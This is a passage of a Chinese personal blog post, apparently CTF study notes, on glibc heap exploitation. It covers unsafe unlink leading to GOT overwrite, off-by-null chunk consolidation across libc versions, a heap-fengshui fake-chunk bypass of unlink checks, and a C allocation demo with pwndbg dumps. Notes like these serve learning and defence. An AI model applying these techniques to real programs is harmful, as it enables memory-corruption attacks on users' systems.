+<p>结论：target 指针指向 &amp;target-0x18。我见过的问题一般利用在全局指针数组中，通过这种方式修改got表内容。<br>改<code>arr[0]</code>，这样就可以修改和读取 <code>arr[0]</code> 。改成got表，读取内容，泄露地址，又可以修改就直接修改got表内容。<br><del>没有所有权的编程是这样的</del></p>
+<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>也是堆溢出的一种形式，但还是区分一下。在这里可以攻击保护全开的程序，主要利用点为堆可以合并。</p>
+<p>libc2.29 以前</p>
+<ul>
+<li>先释放chunk A.</li>
+<li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为0.</li>
+<li>再释放chunk C。</li>
+</ul>
+<p>libc2.29 以后有个检查，会检查prev_chunk size是否和当前的 chunk 的 prev_size 相同，而 off by null，我们无法直接改变 chunk size，因此我们在chunk里伪造一个chunk</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure>
+
+<p>修改后的off by null利用手段，因为没有arena的检查，只是检查了in_use位和size相关检查</p>
+<ul>
+<li>三个堆 A，B，C，最好是 0x438 这种不是整数类型的，会存在一段公用的结果。c防止与top_chunk合并</li>
+<li>编辑A，在A中<strong>伪造一个堆</strong>，覆盖掉B的prev_inuse 位</li>
+<li>free掉B，就会向后合并。</li>
+<li>但是需要绕过unlink_chunk中对fd, bk检查 <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>。</li>
+</ul>
+<p>简单点的题目会给我们一个基地址，这里我们就可以直接像unlink一样修改fd,bk就行</p>
+<ul>
+<li>tcache leak 在libc 2.32 需要 <code>(fd&gt;&gt;12) ^ 0</code></li>
+<li>unsorted bin 存在两个chunk，泄露其中一个的 fd,bk可以得到堆地址</li>
+<li>largebin 的四个指针，只有一个chunk可以使用fd_nextsize 和 bk_nextsize指向自己</li>
+</ul>
+<p>在比较苛刻的条件下，我们不能泄露堆地址，但是可以通过布局heap fengshui 进行伪造fake chunk。假设程序存在off by null</p>
+<ul>
+<li>a-x-b-c-x-d-x, a,b,c,d 大小都在unsorted bin里，x是避免合并的chunk （c&gt;d&gt;a&#x3D;b）</li>
+<li>free a, c, d 拿fd来说就是形成 d-&gt;c-&gt;a-&gt;arena 的链表。</li>
+<li>free b 这时候b,c合并。变成了 b-&gt;d-&gt;a-&gt;arena 链表，但是这时候c的指针并没有清除。</li>
+<li>unsorted bin FIFO。此处需要将 a，d放入largebin里，然后切割 b-c，生成e，e包含c的 fd, bk指针。</li>
+<li>清空unsorted bin 获得f</li>
+<li>编辑 e，可以改原来c位置的size，并且同时包含了fd, bk 指针。因此此处我们需要改一点完成unlink中的检查。</li>
+<li>之前chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;d。因为其放入了largebin里 a-&gt;bk &#x3D; d， d-&gt;fd &#x3D; a，无法通过检查，因此我们需要想办法满足条件</li>
+<li>将a,d从large bin 拿出来。</li>
+<li>bypass bk指针：free a, free f。a-&gt;bk &#x3D; f, 将a拿出来，不会清空指针，修改一下bk指针，因为f和c距离比较近，因此我们可以通过partial write修改bk</li>
+<li>bypass fd指针: 直接向bypass bk一样，bk指向的是arena。free f, free d，d-&gt;fd&#x3D;f。让后让其进入largebin里，d-&gt;fd&#x3D;f。拿回d就行<ul>
+<li>这里为什么不在unsortbin里：直接拿出d，会先将f放入largebin，然后d-&gt;arena 形成链表。先拿f再拿出d, d-&gt;arena链表。都破坏了fd指针（没有指向堆。</li>
+</ul>
+</li>
+</ul>
+<p>可以使用这段代码调试，没有指针改变，主要看的是可行性。</p>
+<ul>
+<li>最好重新分布一下size，最简单是修改 <code>x0</code> 大小。保证f和c 只有最后一个字节不同</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// 切割 b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// 清除unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin 获得 p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin 获得 p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>bk bypass</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里bk需要覆盖2byte才行，可以优化size，让其只覆盖1byte就行。</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure>
+
+<p>fd bypass</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul>
+<li>kernel 存在很多的 list_head 结构体，我们可以使用 <strong>条件竞争</strong> 来修改指针，借助如同 msg_msg 结构体来进行任意地址写</li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197635">How2Heap堆利用学习笔记（三）：Unsafe_unlink</a></li>
+<li><a target="_blank" rel="noopener" href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-堆基础之Unsafe Unlink)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Glibc-unlink"><span class="toc-number">1.</span> <span class="toc-text">Glibc unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">2.</span> <span class="toc-text">Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uaf"><span class="toc-number">2.1.</span> <span class="toc-text">uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-unlink"><span class="toc-number">2.2.</span> <span class="toc-text">unsafe unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-number">2.3.</span> <span class="toc-text">off by null</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel"><span class="toc-number">3.</span> <span class="toc-text">kernel ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2023/09/13/unsafe-unlink/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&text=unsafe-unlink"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&is_video=false&description=unsafe-unlink"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unsafe-unlink&body=Check out this article: https://ha0-y.github.io/2023/09/13/unsafe-unlink/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&name=unsafe-unlink&description=&lt;blockquote&gt;
+&lt;p&gt;经典漏洞&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&t=unsafe-unlink"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    h4m5ter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
